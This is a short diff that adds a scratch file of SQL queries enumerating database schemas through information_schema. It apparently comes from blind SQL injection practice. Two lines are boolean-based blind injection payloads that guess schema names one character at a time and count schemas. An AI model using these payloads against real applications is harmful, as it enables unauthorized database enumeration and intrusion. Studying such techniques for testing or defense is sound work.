@@ -1,0 +1,16 @@
+
+#select distinct table_schema from information_schema.tables where table_type = "base table";
+
+#select distinct table_schema from information_schema.tables where table_type = "base table" limit 1;
+
+
+#1' and substring((select distinct table_schema from information_schema.tables where table_type = "base table" limit 1),1,1)='d' -- 
+
+
+#1' and (select count(distinct table_schema) from information_schema.tables where table_type = "base table")='6' -- 
+
+
+
+        select distinct table_schema from information_schema.tables where table_type = "base table"
+
+
